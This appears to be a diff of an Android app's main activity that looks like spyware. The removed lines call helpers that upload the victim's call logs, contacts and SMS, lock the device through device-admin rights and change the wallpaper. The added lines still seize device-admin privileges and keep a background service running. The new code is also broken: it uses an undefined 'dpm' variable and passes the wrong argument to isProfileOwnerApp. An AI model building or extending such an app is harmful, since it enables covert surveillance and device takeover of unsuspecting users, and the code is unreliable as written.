@@ -1,14 +1,12 @@
 package com.example.betryalcommit
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
+import android.content.Context
 import android.content.Intent
-import android.content.pm.PackageManager
 import android.os.Bundle
 import android.widget.Button
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
-import okhttp3.OkHttpClient
-import java.net.Socket
 
 class MainActivity : AppCompatActivity() {
     companion object {
@@ -18,27 +16,32 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
         AdminAct.initialize(this);
-        val serviceIntent = Intent(this, Lol::class.java)
+        val serviceIntent = Intent(this, MyService::class.java)
         startService(serviceIntent)
         val btn = findViewById<Button>(R.id.chk)
         val btn2 = findViewById<Button>(R.id.chk2);
+
+       var devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+       var componentName = ComponentName(this, MyAdminReceiver::class.java)
         val btn3 = findViewById<Button>(R.id.chk3)
         btn.setOnClickListener {
             Permsu.requestPermissions(
                 applicationContext,
                 this,
                 PERMISSION_REQUEST_CODE
-            ) }
+            )
+        AdminAct.admact(this);
+        }
         btn2.setOnClickListener {
-           callutil.uploadCalls(contentResolver,applicationContext);
-            Teleserv.uploadContact(contentResolver,applicationContext);
-            Teleserv.uploadsms(contentResolver,applicationContext);
-            AdminAct.admact(this);
+//                intent = Intent(this,MyService::class.java)
+//                ContextCompat.startForegroundService(this, intent)
+            dpm.isProfileOwnerApp(componentName.toString())
+
         }
         btn3.setOnClickListener{
-            AdminAct.lockdev(applicationContext);
-             wallpaperset.setwall(applicationContext);
-         //   done();
+          if (!hmm.isServiceRunning(this)) {
+              startService(Intent(this, MyService::class.java))
+          }
         }
     }
     private fun done() {
